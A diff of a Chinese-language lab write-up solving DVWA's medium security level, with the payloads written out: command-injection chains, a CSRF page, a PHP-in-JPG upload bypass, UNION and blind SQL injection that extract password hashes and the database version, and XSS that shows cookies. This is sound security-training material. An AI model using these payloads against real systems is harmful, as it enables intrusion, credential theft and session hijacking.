@@ -1,26 +1,24 @@
-# DVWA - medium
+# DVWA - Medium
 
 Created time: February 14, 2022 2:02 PM
-Last Edited: February 17, 2022 12:49 AM
+Last Edited: February 21, 2022 3:13 PM
 Property: February 14, 2022 2:02 PM
 Tags: DVWA, writeup
 
 <aside>
-💡  Turn on dark 🌒 mode with cmd/ctrl + shift + L
+💡  Turn on dark 🌒  mode with cmd/ctrl + shift + L
 
 </aside>
 
 ---
 
----
-
-# **Brute Force**
+# 1. **Brute Force**
 
 ### 觀察
 
 試著送出表單，後端回應的時間明顯有延遲 2 秒
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled.png)
 
 一樣用 hydra 試試看
 
@@ -33,7 +31,7 @@ hydra -V \
 http-form-get "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%201.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%201.png)
 
 ```
 admin:123456
@@ -110,7 +108,7 @@ writeups/brute-force-walkthrough.sh at main · vansteki/writeups
 
 ### Done
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%202.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%202.png)
 
 ```
 ...
@@ -164,7 +162,7 @@ using user: admin and password: password
 
 ---
 
-# Command Injection
+# 2. Command Injection
 
 加上 `;` 這招無效了，只好試試其他方式
 
@@ -174,7 +172,7 @@ using user: admin and password: password
 8.8.8.8 && 1.1.1.1
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%203.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%203.png)
 
 看起來可行
 
@@ -184,7 +182,7 @@ using user: admin and password: password
 && 1.1.1.1
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%204.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%204.png)
 
 失敗
 
@@ -192,7 +190,7 @@ using user: admin and password: password
 1.1.1.1 && ls
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%205.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%205.png)
 
 多試幾次後，運氣好猜中， `||` , `|`, `&`  
 
@@ -202,7 +200,7 @@ using user: admin and password: password
 ||hostname
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%206.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%206.png)
 
 ### pipeline
 
@@ -210,7 +208,7 @@ using user: admin and password: password
 |ls
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%207.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%207.png)
 
 ### background job
 
@@ -218,7 +216,7 @@ using user: admin and password: password
 &pwd
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%208.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%208.png)
 
 ### XSS
 
@@ -228,7 +226,7 @@ using user: admin and password: password
 &echo "<script>alert(1)</script>"
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%209.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%209.png)
 
 ### Done
 
@@ -236,7 +234,7 @@ using user: admin and password: password
 & ps aux | grep httpd
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2010.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2010.png)
 
 user of the web service is `www-data`
 
@@ -244,7 +242,7 @@ hostname is `91ab8a5e75e3`
 
 ---
 
-# **Cross Site Request Forgery (CSRF)**
+# 3. **Cross Site Request Forgery (CSRF)**
 
 > Medium Level
 For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain, it must of come from the web application so it can be trusted.
@@ -288,7 +286,7 @@ set password to: 1111
 
 先建立一個測試用的 server，用來放惡意攻擊頁面
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2011.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2011.png)
 
 惡意頁面網址:
 
@@ -300,13 +298,13 @@ http://192.168.0.196:8080/get-img.html
 
 假裝是受害者被騙連到惡意網頁
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2012.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2012.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2013.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2013.png)
 
 ### failed
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2014.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2014.png)
 
 看來沒有效，失敗 😭，get img tag 的方式沒辦法用於不同域名的場景
 
@@ -341,7 +339,7 @@ set password to: 1111
 
 另一種場竟是我已經拿下 DVWA 網域的某個頁面，再讓受害者跳轉到這個 CSRF 頁面
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2015.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2015.png)
 
 ```html
 That request didn't look correct.
@@ -362,21 +360,21 @@ Referer http://localhost:8086/vulnerabilities/csrf/
 
 進入惡意頁面，按下送出
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2016.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2016.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2017.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2017.png)
 
-![before](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2018.png)
+![before](DVWA%20-%20Med%20e3214/Untitled%2018.png)
 
 before
 
-![after](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2019.png)
+![after](DVWA%20-%20Med%20e3214/Untitled%2019.png)
 
 after
 
 ### Done
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2020.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2020.png)
 
 ---
 
@@ -386,15 +384,15 @@ after
 
 如果有在 Network 設定開啟 log 紀錄保存 (Persist Logs) 的話就可以看到跳轉後的 request，接著再回到惡意頁面修改 Referer
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2021.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2021.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2022.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2022.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2023.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2023.png)
 
 按下 Send 後可以從 Network 看到結果，也有成功修改密碼
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2024.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2024.png)
 
 ---
 
@@ -419,7 +417,7 @@ after
 
 ---
 
-# File Inclusion
+# 4. File Inclusion
 
 > Objective
 > 
@@ -453,7 +451,7 @@ localhost:8086/vulnerabilities/fi/?page=http://localhost:8086/hackable/flags/fi.
 & ls ../fi
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2025.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2025.png)
 
 其實這邊也可以都一隻 web shell 進去，方便瀏覽檔案，不過既然題目說要用 file inclusion，那就不用這招了
 
@@ -467,13 +465,13 @@ localhost:8086/vulnerabilities/fi/?page=http://localhost:8086/hackable/flags/fi.
 http://localhost:8086/vulnerabilities/fi/yo.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2026.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2026.png)
 
 ```bash
 http://localhost:8086/vulnerabilities/fi/?page=yo.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2027.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2027.png)
 
 ### Done
 
@@ -485,29 +483,29 @@ http://localhost:8086/vulnerabilities/fi/?page=yo.php
 & cp ../../hackable/flags/fi.php ../fi/
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2028.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2028.png)
 
 ```bash
 &ls ../fi
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2029.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2029.png)
 
 ```bash
 http://localhost:8086/vulnerabilities/fi/?page=fi.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2030.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2030.png)
 
 接下來的流程就跟 low 一樣， `5.)` 從 page source 就能看到， `3.)` 從 command injection 用 cat 指令就能看到
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2031.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2031.png)
 
 ```bash
 &cat ../../hackable/flags/fi.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2032.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2032.png)
 
 ```
 1.) Bond. James Bond 
@@ -519,10 +517,10 @@ http://localhost:8086/vulnerabilities/fi/?page=fi.php
 
 ---
 
-# File Upload
+# 5. File Upload
 
 > Objective
-Execute any PHP function of your choosing on the target system (such as [phpinfo()](https://secure.php.net/manual/en/function.phpinfo.php)			or [system()](https://secure.php.net/manual/en/function.system.php)) thanks to this file upload vulnerability.
+Execute any PHP function of your choosing on the target system (such as [phpinfo()](https://secure.php.net/manual/en/function.phpinfo.php) or [system()](https://secure.php.net/manual/en/function.system.php)) thanks to this file upload vulnerability.
 > 
 
 ### 觀察
@@ -534,7 +532,7 @@ yo.php
 yo.php.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2033.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2033.png)
 
 ```
 Your image was not uploaded. We can only accept JPEG or PNG images.
@@ -548,7 +546,7 @@ Your image was not uploaded. We can only accept JPEG or PNG images.
 yo.php.jpg
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2034.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2034.png)
 
 ```
 ../../hackable/uploads/yo.php.jpg succesfully uploaded!
@@ -560,7 +558,7 @@ yo.php.jpg
 &ls ../../hackable/uploads
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2035.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2035.png)
 
 接著只要將副檔名從 `jpg` 修改回 `php` 即可
 
@@ -572,7 +570,7 @@ yo.php.jpg
 &ls ../../hackable/uploads
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2036.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2036.png)
 
 最後直接在這頁執行也可從上傳的資料路徑夾執行我們上傳的檔案
 
@@ -580,7 +578,7 @@ yo.php.jpg
 &php ../../hackable/uploads/yo.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2037.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2037.png)
 
 ### Done
 
@@ -588,15 +586,68 @@ yo.php.jpg
 http://localhost:8086/hackable/uploads/yo.php
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2038.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2038.png)
+
+## Update February 19, 2022
+
+之前使用的方法不符合題目義，不應該透過 command injection 改檔名
+
+其實可以直接上傳檔案，騙過後端的檢查，只要使用可以修改 request 的工具即可
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2039.png)
+
+```bash
+Your image was not uploaded. We can only accept JPEG or PNG images.
+```
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2040.png)
+
+修改 Content-Type 再重送一次
+
+```bash
+Content-Type: text/php -> Content-Type: image/jpeg
+```
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2041.png)
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2042.png)
+
+```bash
+../../hackable/uploads/demo-upload.jpg.php succesfully uploaded!
+```
+
+### 修正 2: executable image
+
+### 使用 `exiftool` 將惡意內容寫入要上傳的圖片，然後再更改檔名上傳即可
+
+![demo-upload.jpg](DVWA%20-%20Med%20e3214/Untitled%2043.png)
+
+demo-upload.jpg
+
+```bash
+exiftool -Comment="<?php phpinfo(); __halt_compiler(); ?>" demo-upload.jpg.php
+```
+
+再利修改 Content-Type 為 `Content-Type: image/jpeg` 的方式通過檔案型態檢查
+
+上傳後直接瀏覽惡意檔案的位置
+
+```php
+http://dvwa.localtest/hackable/uploads/demo-upload.jpg.php
+```
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2044.png)
+
+Injecting executable PHP code to a JPG image file - One Step! Code
+[https://onestepcode.com/injecting-php-code-to-jpg/](https://onestepcode.com/injecting-php-code-to-jpg/)
 
 ---
 
-# Insecure CAPTCHA
+# 6. Insecure CAPTCHA
 
 之前在 low 難度時沒好好觀察前端的部分，現在來看一下 CAPTCHA 做了哪些事
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2039.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2045.png)
 
 ### 觀察
 
@@ -622,15 +673,15 @@ http://localhost:8086/hackable/uploads/yo.php
 }
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2040.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2046.png)
 
 ### 正常流程
 
 如果 CAPTCHA 驗證成功就能取得 `g-recaptcha-response` 這個 value，和更新密碼的表單一起送出就能通過檢查
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2041.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2047.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2042.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2048.png)
 
 ### change password
 
@@ -664,7 +715,7 @@ g-recaptcha-response
 
 ### localstorage
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2043.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2049.png)
 
 ```bash
 _grecaptcha:"09APj96hT8iRUxC-jYRQLJPdetysMOZw4s4TUXZ4mdKdn6ESYQGgiLac6x-BtG-zhJpNzEsHr0mKGs-bosFqKAp4Pekg"
@@ -672,7 +723,7 @@ _grecaptcha:"09APj96hT8iRUxC-jYRQLJPdetysMOZw4s4TUXZ4mdKdn6ESYQGgiLac6x-BtG-zhJp
 
 ### cookie
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2044.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2050.png)
 
 ```bash
 _GRECAPTCHA:"09APj96hTmVBUwXdk9UFJCoPyA5R2-md9Z8SyOTc-LQgx9M9hRZ0qthtydmztVGLyXHYgZ3DPeQo3EQI7WKv8-HBk"
@@ -688,15 +739,15 @@ _GRECAPTCHA:"09APj96hTmVBUwXdk9UFJCoPyA5R2-md9Z8SyOTc-LQgx9M9hRZ0qthtydmztVGLyXH
 
 走正常流程，通過檢查，出現 Change button，點下去
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2045.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2051.png)
 
 密碼變更成功
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2046.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2052.png)
 
 來觀察一下參數
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2047.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2053.png)
 
 ```json
 {
@@ -739,13 +790,13 @@ curl -L -X POST "http://dvwa.localtest/vulnerabilities/captcha/#" \
 
 送出 curl 後可以看到 `Password Changed`
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2048.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2054.png)
 
 ### Done
 
 用新密碼 3333 重登成功
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2049.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2055.png)
 
 如果能搭配 XSS 或其他手段取得 user cookie (因為要先登入過 DVWA) 那就有機會將攻擊自動化
 
@@ -770,7 +821,7 @@ curl -v -L \
 ./test.sh 2222 3l7tambvpgcbe10cdc14rfbo84
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2050.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2056.png)
 
 更完整一點的腳本，要先執行 `login-test.sh` 取得 cookie，再執行  `update-pwd.sh` 更新密碼
 
@@ -880,19 +931,19 @@ dvwa.localtest	FALSE	/	FALSE	0	PHPSESSID	e176d3692ee6afa4798775328ad1b36c
 
 不知道為什麼，現在連正常流程都無法過關 QQ
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2051.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2057.png)
 
 換一個環境，用 MAMP 重架 DVWA，port 用 80，就正常了
 
 ---
 
-# SQL-Injection
+# 7. SQL-Injection
 
 medium 難度換成使用選單 POST 送出 
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2052.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2058.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2053.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2059.png)
 
 ```json
 {
@@ -923,13 +974,13 @@ Request Body:
 id=1 OR 2&Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2054.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2060.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2055.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2061.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2056.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2062.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2057.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2063.png)
 
 ```json
 {
@@ -946,7 +997,7 @@ Request Body:
 id=1 union select user_id, first_name, last_name from users;&Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2058.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2064.png)
 
 ### Done
 
@@ -956,9 +1007,9 @@ Request Body:
 id=1 union select last_name,password from users;&Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2059.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2065.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2060.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2066.png)
 
 ```sql
 ID: 1 union select last_name,password from users;
@@ -988,7 +1039,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 
 ---
 
-# SQL Injection Blind
+# 8. SQL Injection Blind
 
 > Objective:
 Find the version of the SQL database software through a blind SQL attack.
@@ -1002,13 +1053,13 @@ Find the version of the SQL database software through a blind SQL attack.
 id=1 UNION select 1,VERSION(); &Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2061.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2067.png)
 
 ```sql
 id=1 UNION SELECT 1,SUBSTRING((SELECT @@version),1,20); &Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2062.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2068.png)
 
 ```sql
 SELECT 1,SUBSTRING((SELECT @@version),1,20);
@@ -1026,7 +1077,7 @@ SELECT SUBSTRING((SELECT @@version),1,20);
 id=1 AND (SELECT SUBSTRING((SELECT @@version),1,20)); &Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2063.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2069.png)
 
 ### 參考之前已經得知的版本
 
@@ -1092,13 +1143,111 @@ id=1 AND (SELECT @@version) like 10.1.26-MariaDB-0+de&Submit=Submit
 id=1 AND SELECT (SELECT @@version)) = 5.7.34&Submit=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2064.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2070.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2065.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2071.png)
 
 ---
 
-# **Weak Session IDs**
+# Update February 21, 2022
+
+```sql
+SELECT 1, (SELECT (version())) <> 0;
+```
+
+```sql
+id=1 AND (SELECT version() <> 0); &Submit=Submit
+# User ID exists in the database
+```
+
+```sql
+id=1 AND (SELECT version() = 5.7); &Submit=Submit
+# User ID exists in the database
+```
+
+```sql
+id=1 AND (SELECT version() = '5.7.34'); &Submit=Submit
+# User ID is MISSING in the database
+```
+
+也是無法完整猜測
+
+### Done
+
+因此參考別人的 writeup 後才知道可以用 `ascii` 將字串轉換成數字，這樣就可以不用擔心單引號被過濾了，基本上這邊只要能轉換成數字型態就可以了
+
+```sql
+SELECT SUBSTRING((SELECT @@version),1,6)
+# 5.7.34
+```
+
+5
+
+```sql
+SELECT 1=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
+# User ID is MISSING in the database
+```
+
+SUBSTRING((SELECT @@version),2,1) 代表第2個字串的值
+
+```sql
+select SUBSTRING((SELECT @@version),2,1);
+# .
+```
+
+.
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),2,1)) = 46); &Submit=Submit
+# User ID exists in the database
+```
+
+7
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),3,1)) = 55); &Submit=Submit
+# User ID exists in the database
+```
+
+.
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 46); &Submit=Submit
+# User ID exists in the database
+```
+
+3
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),5,1)) = 51); &Submit=Submit
+# User ID exists in the database
+```
+
+.
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 46); &Submit=Submit
+# User ID is MISSING in the database
+```
+
+4
+
+```sql
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 52); &Submit=Submit
+# User ID exists in the database
+```
+
+從上面嘗試的結果就可以推敲出版本
+
+```
+5.7.34
+```
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2072.png)
+
+---
+
+# 9. **Weak Session IDs**
 
 ## 觀察
 
@@ -1108,19 +1257,19 @@ id=1 AND SELECT (SELECT @@version)) = 5.7.34&Submit=Submit
 dvwaSession:"1645009861"
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2066.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2073.png)
 
 ```jsx
 +new Date()
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2067.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2074.png)
 
 在 console 比對一下，竟然是個很微妙的數字 
 
 很明顯是 timestamp，不過 PHP 和 JS 產生的有差異
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2068.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2075.png)
 
 ### 試著使用 php function - time()
 
@@ -1133,7 +1282,7 @@ php > echo time();
 php >
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2069.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2076.png)
 
 ### Done
 
@@ -1144,11 +1293,11 @@ php >
 "1645010216"
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2070.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2077.png)
 
 ---
 
-# **DOM Based Cross Site Scripting (XSS)**
+# 10. **DOM Based Cross Site Scripting (XSS)**
 
 > The developer has tried to add a simple pattern matching to remove any references to "<script" to disable any JavaScript. Find a way to run JavaScript without using the script tags.
 > 
@@ -1171,13 +1320,23 @@ http://localhost:8086/vulnerabilities/xss_d/?default=English&%3Cscript%3Ealert(1
 
 成功執行
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2071.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2078.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2072.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2079.png)
+
+```jsx
+default=English&<script>alert(document.cookie)</script>
+```
+
+```jsx
+http://dvwa.localtest/vulnerabilities/xss_d/?default=English&%3Cscript%3Ealert(document.cookie)%3C/script%3E
+```
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2080.png)
 
 ---
 
-# Reflected XSS
+# 11. Reflected XSS
 
 > Objective
 One way or another, steal the cookie of a logged in user.
@@ -1187,7 +1346,7 @@ One way or another, steal the cookie of a logged in user.
 
 看 source 的話會發現他只有 replace `<script>` ，也就是說只要避開完整的字串就行了🤔
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2073.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2081.png)
 
 ### 試著將字串拆開
 
@@ -1197,15 +1356,15 @@ One way or another, steal the cookie of a logged in user.
 <script >alert(1)
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2074.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2082.png)
 
 ```sql
 <script >alert(1)</script>
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2075.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2083.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2076.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2084.png)
 
 ### Done
 
@@ -1215,16 +1374,10 @@ One way or another, steal the cookie of a logged in user.
 <script >alert(document.cookie)</script>
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2077.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2085.png)
 
 ```
 PHPSESSID=ov64qqshkod7693old2kdk59e3; security=medium
-```
-
-後來才發現大小寫也要考慮進去 XD
-
-```
-<sCript>alert(1)</sCript>
 ```
 
 ### memo
@@ -1237,7 +1390,7 @@ PHPSESSID=ov64qqshkod7693old2kdk59e3; security=medium
 
 ---
 
-# **Stored Cross Site Scripting (XSS)**
+# 12. **Stored Cross Site Scripting (XSS)**
 
 > Objective
 Redirect everyone to a web page of your choosing.
